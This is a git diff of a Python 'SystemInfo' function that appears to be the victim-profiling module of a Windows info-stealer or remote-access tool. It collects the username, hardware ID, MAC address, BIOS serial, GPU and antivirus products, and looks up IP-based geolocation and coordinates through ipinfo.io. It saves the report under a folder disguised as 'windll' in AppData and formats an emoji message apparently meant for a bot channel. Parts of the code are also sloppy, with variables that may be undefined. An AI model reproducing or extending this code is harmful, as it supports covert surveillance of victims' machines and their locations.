@@ -74,19 +74,6 @@ def SystemInfo(msgdata):
             return None
 
 
-    gpsList =[]
-
-    def get_gpu_info():
-        try:
-            c = wmi.WMI()
-            gpu_info = []
-            for gpu in c.Win32_VideoController():
-                gpu_info.append((gpu.DeviceID, gpu.Name))
-            return gpu_info
-        except:
-            return []
-
-
 
     def get_size(bytes, suffix="B"):
         factor = 1024
@@ -107,19 +94,42 @@ Name of drive: {drive.mountpoint}
 Type of file system: {drive.fstype}
 """
         if drive.opts != 'cdrom':
-            mount = psutil.drive_usage(drive.mountpoint)
+            mount = psutil.disk_usage(drive.mountpoint)
             drives_info += f"""Drive space: {get_size(mount.total)}
 drive space available: {get_size(mount.free)}
 drive space used: {get_size(mount.used)}
 """
-
+    try:
+        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
+    except:
+        hwid = "Can't get"  
     
     gpu_info = ""
+
+
+    try:
+        gpus = GPUtil.getGPUs()
+        list_gpus = []
+        for gpu in gpus:
+            gpu_name = gpu.name# get Type of GPU
+            gpu_free_memory = f"{gpu.memoryFree}MB"# get Available GPU memory
+            gpu_total_memory = f"{gpu.memoryTotal}MB"# get Total GPU memory
+            gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
+            gpu_temperature = f"{gpu.temperature} °C\n"# get GPU temperature
+            gpu_info += f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
+            list_gpus.append(gpu.name)
+    except:
+        list_gpus.append('No GPU')
+        gpu_info += "No GPU"
+
+
+    '''
     try:
         gpus = GPUtil.getGPUs()
         for gpu in gpus:
-            gpu_info += f"""GPU ID: {gpu.id}
-Name: {gpu.name}
+            gpu_info += f"""\nName: {gpu.name}
+GPU ID: {gpu.id}
 Load: {gpu.load} "%"
 Memory Total: {gpu.memoryTotal}
 Memory Used: {gpu.memoryUsed}
@@ -130,12 +140,15 @@ Temperature: {gpu.temperature} C"""
     except:
         gpu_info += "No GPU"
         gpsList.append("No GPU")
+    
+    print(gpsList)
 
     gpu_data = get_gpu_info()
     if gpu_data:
         for device_id, name in gpu_data:
             gpu_info += f"Device ID: {device_id}\n"
             gpu_info += f"Name: {name}\n"
+            '''
 
 
     Antiviruses = {
@@ -163,38 +176,33 @@ Temperature: {gpu.temperature} C"""
     try:
         ip_data = json.loads(requests.get('https://ipinfo.io/json').text)
         external_ip = ip_data['ip']
-        output = ""
         if 'city' in ip_data:
-            output += f"City: {ip_data['city']}\n"
+            city = f"🏙City: {ip_data['city']}\n"
         if 'region' in ip_data:
-            output += f"Region: {ip_data['region']}\n"
+            region = f"Region: {ip_data['region']}\n"
         if 'country' in ip_data:
-            output += f"Country: {ip_data['country']}\n"
+            country = f"🗺Country: {ip_data['country']}\n"
         if 'loc' in ip_data:
-            output += f"Coordinates: {ip_data['loc']}\n"
+            loc = f"Coordinates: {ip_data['loc']}\n"
         if 'org' in ip_data:
-            output += f"Organization: {ip_data['org']}\n"
+            org = f"Organization: {ip_data['org']}\n"
         if 'timezone' in ip_data:
-            output += f"Timezone: {ip_data['timezone']}\n"
+            timezone = f"⌚Timezone: {ip_data['timezone']}\n"
         if 'postal' in ip_data:
-            output += f"Postal: {ip_data['postal']}\n"
+            postal = f"Postal: {ip_data['postal']}\n"
 
     except:
         external_ip = "Can't get"
         ip_data = "Can't get"
-    try:
-        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
-                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
-    except:
-        hwid = "Can't get"
     ip_info += f"""
 External IP: {external_ip}
 Internal IP: {internal_ip}
-{output}
-
-HWID: {hwid}
-MAC Address: {get_mac_address()} 
+{loc}{org}{postal}
 """
+    ip_info_msg = f"""
+External IP: {external_ip}
+Internal IP: {internal_ip}
+{loc}"""
     info =""
 
     serial_number = get_bios_serial_number()
@@ -215,21 +223,25 @@ MAC Address: {get_mac_address()}
 
 =====================MAIN=====================
 Time: {time.asctime()}
+{timezone}{city}{region}{country}
 Username: {os.getlogin()}
 PC Name: {uname.node}
 Operation System: {uname.system}
 OS Release: {uname.release}
 OS Version: {uname.version}
 Machine: {uname.machine}
+HWID: {hwid}
+MAC Address: {get_mac_address()} 
 {info}
+
 
 ====================Network===================
 {ip_info}
-
 =====================CPU======================
 CPU: {platform.processor()}
 Count of cores of CPU: {psutil.cpu_count(logical=True)}
 CPU frequency: {psutil.cpu_freq()} MHz
+
 
 =====================GPU======================
 {gpu_info}
@@ -239,6 +251,7 @@ RAM: {get_size(svmem.total)}
 RAM Available: {get_size(svmem.available)}
 RAM Used: {get_size(svmem.used)}
 
+
 ====================DRIVES====================
 {drives_info}
 
@@ -247,22 +260,26 @@ Antiviruses: {', '.join(Antiviruses)}
 """
     pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
-    file.write(logo)
     file.write(systeminfo)
     
-    msgdata=f"""<b>🖥System🖥</b>
+    msgdata=f"""
+**🖥System🖥**
 ⏲Time: {time.asctime()}
-👤Username: {os.getlogin()}
+{timezone}{city}{country}👤Username: {os.getlogin()}
 👤PC Name: {uname.node}
 🖥OS: {uname.system} {uname.release}
+📋HWID: {hwid}
+📋MAC Address: {get_mac_address()} 
 
-<b>🖥Hardware🖥</b>
+
+**🖥Hardware🖥**
 🔧CPU: {platform.processor()}
 🔧RAM: {get_size(svmem.total)}
-🔧GPU: {', '.join(gpsList)}
+🔧GPU: {', '.join(list_gpus)}
 🛡Antiviruses: {', '.join(Antiviruses)}
 
-<b>📡Network📡</b>{ip_info}
+
+**📡Network📡**{ip_info_msg}
 """
     return msgdata
 '''
